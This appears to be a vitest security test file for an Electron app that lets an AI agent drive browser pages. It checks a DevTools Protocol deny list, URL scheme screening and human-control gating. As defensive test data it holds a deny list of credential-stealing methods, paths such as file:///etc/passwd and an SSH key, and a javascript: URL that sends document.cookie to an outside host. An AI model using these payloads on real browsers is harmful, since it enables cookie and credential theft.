import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import {
  ALLOWED_METHODS,
  DENIED_METHODS,
  isDrivableUrl,
  screenCommand,
  type DriveState,
} from './browser-cdp'

/**
 * The security boundary, pinned.
 *
 * `DRIVABLE-BROWSER.md` §2.5 says three tests have to exist "or none of this is
 * true", and names them. They are here, adapted to the shape that shipped:
 * there is no listening socket and no target table, because the engine is this
 * repository's own driver rather than Playwright, so the questions "can the
 * renderer be enumerated" and "can a denied method be sent" are answered
 * structurally rather than over a wire.
 *
 * The structural ones are source assertions, deliberately. A test that pokes an
 * API can only show that the door in front of it is shut; these show that there
 * is no second door — which is the actual claim being made about this feature,
 * and the only kind of test that fails when somebody adds one.
 */

const SRC = join(__dirname)

function source(file: string): string {
  return readFileSync(join(SRC, file), 'utf8')
}

describe('the debugger channel is not reachable from anywhere else', () => {
  /*
   * §2.5 test 1, restated for a design with no target table.
   *
   * The design's version asserted that `Target.getTargets` returns exactly one
   * entry and that the renderer's id is not attachable. That test belongs to a
   * bridge that enumerates targets for Playwright. This driver never
   * enumerates: it holds one `WebContents` handed to it by the drive
   * registry, and the app's own renderer is not merely filtered out of a list —
   * there is no list. So what has to be pinned is the *absence* of the two
   * calls that would create one.
   */
  it('never asks Electron for every WebContents in the process', () => {
    for (const file of ['browser-cdp.ts', 'browser-drive.ts', 'browser-driver.ts']) {
      expect(source(file)).not.toContain('getAllWebContents')
      expect(source(file)).not.toContain('fromWebContents')
    }
  })

  it('sends debugger commands from exactly one place, and that place screens them', () => {
    const driver = source('browser-driver.ts')
    const sends = driver.match(/debugger\.sendCommand\(/g) ?? []
    expect(sends).toHaveLength(1)
    // …and that one call site is preceded by the screening, in the same
    // function. Matching the text rather than the behaviour is the point: a
    // second `sendCommand` added anywhere would fail the count above, and a
    // first one that dropped the check would fail this.
    const sendBody = driver.slice(driver.indexOf('private async send('), driver.indexOf('/** Announce and send'))
    expect(sendBody).toContain('screenCommand(')
    expect(sendBody.indexOf('screenCommand(')).toBeLessThan(sendBody.indexOf('sendCommand('))
  })

  it('runs page script from exactly one place, and that place checks the baton', () => {
    const driver = source('browser-driver.ts')
    const runs = driver.match(/executeJavaScriptInIsolatedWorld\(/g) ?? []
    expect(runs).toHaveLength(1)
    // Ends at `hold`, the next member, so the assertion cannot be satisfied by
    // a check belonging to some later method. The state is read off the slot
    // rather than the driver because a driven page is now one of several, and
    // the baton is a fact about a document, not about the driver.
    const runBody = driver.slice(driver.indexOf('private async run<T>'), driver.indexOf('private async hold('))
    expect(runBody).toContain("slot.state !== 'agent'")
  })

  it('has no Electron import in the module that makes the decisions', () => {
    // The whole reason `screenCommand` is a pure function over strings. A file
    // that imported Electron would be a file a test cannot drive, and this is
    // the file whose every branch has to be driven.
    expect(source('browser-cdp.ts')).not.toContain("from 'electron'")
    expect(source('browser-drive.ts')).not.toContain("from 'electron'")
  })
})

describe('the deny list', () => {
  const agent = { state: 'agent' as DriveState }

  /*
   * §2.5 test 2: every method in the table, asserted refused, by name, in a
   * list a reviewer can read against the table in the design document.
   */
  it.each(DENIED_METHODS)('refuses %s', (method) => {
    const verdict = screenCommand({ ...agent, method })
    expect(verdict.ok).toBe(false)
  })

  it('refuses the specific capabilities the design names', () => {
    // Spelled out rather than left to the loop above, so that deleting an entry
    // from the table breaks a test whose name says what was lost.
    const denied = [
      'Browser.close', // closing the browser is the instability he described
      'Target.closeTarget',
      'Network.getAllCookies', // the literal credentials
      'Storage.getCookies',
      'Page.setDownloadBehavior', // "drive a page" becomes "write files anywhere"
      'DOM.setFileInputFiles', // reads his disk into a website
      'Browser.grantPermissions', // re-grants camera and microphone
      'Page.bringToFront', // focus belongs to the person
      'Fetch.enable', // how an agent reads Authorization headers
      'Runtime.evaluate', // the door a `browser.eval` tool would walk through
      'Page.navigate', // measured to bypass will-navigate entirely
    ]
    for (const method of denied) {
      expect(DENIED_METHODS).toContain(method)
      expect(screenCommand({ ...agent, method }).ok).toBe(false)
    }
  })

  it('does not overlap the allow list', () => {
    // If it ever did, the allow check would pass and the deny check would
    // refuse — which is the right outcome, but it would mean the two tables
    // disagree about what this app does, and one of them is wrong.
    const overlap = ALLOWED_METHODS.filter((method) => DENIED_METHODS.includes(method))
    expect(overlap).toEqual([])
  })

  it('refuses anything not on the allow list, including methods nobody has heard of', () => {
    for (const method of ['Console.enable', 'Accessibility.getFullAXTree', 'Nonsense.doThing', '']) {
      expect(screenCommand({ ...agent, method }).ok).toBe(false)
    }
  })

  it('allows exactly the input methods the driver needs', () => {
    for (const method of ALLOWED_METHODS) {
      expect(screenCommand({ ...agent, method }).ok).toBe(true)
    }
    expect(ALLOWED_METHODS).toContain('Input.dispatchMouseEvent')
    expect(ALLOWED_METHODS).toContain('Input.insertText')
  })
})

describe('navigation is re-checked at the channel', () => {
  /*
   * §2.5 test 3, and the one with the sharpest edge.
   *
   * Measured on Electron 41.10.5 / Chromium 146: a CDP `Page.navigate` to
   * `file:///etc/passwd` **succeeded** on a `WebContentsView` that had a
   * `will-navigate` handler installed calling `preventDefault()` on everything.
   * The handler did not run. `webContents.getURL()` afterwards was
   * `file:///etc/passwd`.
   *
   * So the guard in `browser-tab.ts` covers renderer-initiated navigation only,
   * and for a browser-initiated one this check is the whole of the protection.
   */
  it.each([
    'file:///etc/passwd',
    'file:///Users/apple/.ssh/id_rsa',
    'devtools://devtools/bundled/inspector.html',
    'chrome://settings',
    'javascript:fetch("https://x/"+document.cookie)',
    'data:text/html,<script>1</script>',
    'about:blank',
  ])('refuses Page.navigate to %s', (url) => {
    expect(screenCommand({ state: 'agent', method: 'Page.navigate', params: { url } }).ok).toBe(false)
  })

  it('refuses Page.navigate even to an address that would otherwise be fine', () => {
    // Because it is not on the allow list at all. The driver navigates through
    // `loadURL`, which does pass through `normalizeUrl`. If somebody ever adds
    // `Page.navigate` to the allow list, the URL check below is what is left.
    expect(screenCommand({ state: 'agent', method: 'Page.navigate', params: { url: 'https://example.com' } }).ok).toBe(false)
  })

  it('the URL rule itself refuses every scheme but http and https', () => {
    expect(isDrivableUrl('https://example.com/')).toBe(true)
    expect(isDrivableUrl('http://localhost:3000/')).toBe(true)
    expect(isDrivableUrl('file:///etc/passwd')).toBe(false)
    expect(isDrivableUrl('javascript:alert(1)')).toBe(false)
    expect(isDrivableUrl('devtools://x')).toBe(false)
    expect(isDrivableUrl('about:blank')).toBe(false)
    expect(isDrivableUrl('')).toBe(false)
    expect(isDrivableUrl(null)).toBe(false)
  })
})

describe('the baton is checked before the method', () => {
  it('refuses everything while the person has the page, including reads', () => {
    // The whole enforcement story for the password. A screenshot taken while he
    // is typing is the leak, so `human` shuts the channel rather than filtering
    // it — you cannot redact what was never produced.
    for (const method of ALLOWED_METHODS) {
      const verdict = screenCommand({ state: 'human', method })
      expect(verdict.ok).toBe(false)
      if (!verdict.ok) expect(verdict.reason).toContain('the person is using this page')
    }
  })

  it('refuses everything when nothing is being driven', () => {
    for (const method of ALLOWED_METHODS) {
      expect(screenCommand({ state: 'idle', method }).ok).toBe(false)
    }
  })

  it('answers the baton before it answers the method, so the reason names the person', () => {
    // A denied method during a handover must say "the person has it", not
    // "that method is refused" — the model's next move differs completely.
    const verdict = screenCommand({ state: 'human', method: 'Browser.close' })
    expect(verdict.ok).toBe(false)
    if (!verdict.ok) expect(verdict.reason).toContain('the person is using this page')
  })
})
